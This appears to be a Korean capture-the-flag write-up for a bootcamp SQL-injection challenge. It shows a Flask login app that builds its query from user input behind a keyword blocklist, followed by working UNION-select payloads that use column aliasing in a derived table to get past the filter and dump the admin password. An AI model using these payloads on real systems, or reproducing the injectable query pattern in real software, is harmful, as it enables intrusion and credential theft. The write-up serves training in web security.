---
title: "[Writeup] Knockon Bootcamp - 3.5 SQLi_WAF_5"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - SQL Injection
  - Filter Bypass
last_modified_at: 2024-08-30T00:10:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10034/>

![3.5 SQLi WAF 5 1](/assets/images/writeup/web-hacking/knock-on/3-5_SQLi_WAF_5_1.png)

![3.5 SQLi WAF 5 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)

![3.5 SQLi WAF 5 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)

|

|

|

### 목표

---

필터링 로직을 우회하여 admin 계정의 비밀번호 알아내기

|

### 공격 기법

---

SQL Injection

- Filter Bypass

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os
import string

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
MYSQL_HOST = "db"

app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    query = None
    if request.method == "POST":
        filtering_list = ['or', 'and', '"', '=', '<', '>', '\\', '-', '&', '|']
        username = request.form["username"].lower()
        password = request.form["password"].lower()

        for filter in filtering_list :
            if (filter in username) or (filter in password):
                return render_template("login.html", error='no Hack!')

        query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
        
        with db.engine.connect() as connection:
            result = connection.execute(query)
            user = result.fetchone()
        if user:
            return redirect(url_for("success", username=user[1]))
        else:
            error = "Invalid Credentials"
        return render_template("login.html", error=error, query=str(query))
    else :
        return render_template("login.html")

@app.route("/success")
def success():
    username = request.args.get("username", "Unknown")
    flag = request.args.get("flag", "So.. what?")
    return render_template("success.html", username=username, flag=flag)

if __name__ == "__main__":
    db.create_all()
    app.run(debug=True, host="0.0.0.0", port=8080)
```

## 코드 분석

### login()

---

```sql
filtering_list = ['or', 'and', '"', '=', '<', '>', '\\', '-', '&', '|']
```

따옴표는 쓸 수 있음.

|

```sql
if user:
	return redirect(url_for("success", username=user[1]))
```

로그인 성공 시, `success`로 이동하며 `user[1]`을 넘겨줌

|

|

### success()

---

```sql
def success():
    username = request.args.get("username", "Unknown")
    flag = request.args.get("flag", "So.. what?")
    return render_template("success.html", username=username, flag=flag)
```

`success.html`를 렌더링 하면서 `username`과 `flag`를 넘겨주지만, `login()`함수에서는 `user[1]`변수만 넘겨줬기 때문에 변수의 값에 따라 `username` 혹은 `flag` 둘 중 하나만 화면에 나타남

즉, `user[1]`을 `username`이 아니라 flag인 `password`로 직접 변경해줘야 함

|

|

|

## 문제 풀이

```sql
' union select 1,2,3 #
```

쿼리를 입력하면 `user[1]` 부분인 2가 화면에 출력됨

|

```sql
union select 1,password,3 from user where username like 'admin'
```

실행하고자 하는 쿼리는 이런 형태임

|

```sql
union select 1,password,3 from (재구성테이블) where username like 'admin'
```

테이블을 재구성하여 **‘password’**의 **‘or’**을 우회해야 함

|

```sql
-- 테이블 재구성
(select 1, 2 as name, 3 as pw
union
select * from user)owo
```

|

```sql
union
select 1,pw,3 from (
	select 1, 2 as name, 3 as pw
	union
	select * from user)owo
where name like 'admin'
```

테이블 장착

|

|

|

## Exploit

### 방법 1

---

```sql
username: ' UNION SELECT 1, pw, 3 FROM (SELECT 1, 2 AS name, 3 AS pw UNION SELECT * FROM user)owo WHERE name like 'admin' #

password: 1
```

|

### 방법 2

---

```sql
username: ' UNION SELECT 1, (select pw from (select 1,2 as name,3 as pw union select * from user)owo where name like 'admin'), 3 #

password: 1
```

|

|

### FLAG

---

```python
K0{good_4ft3rn00n!}
```

|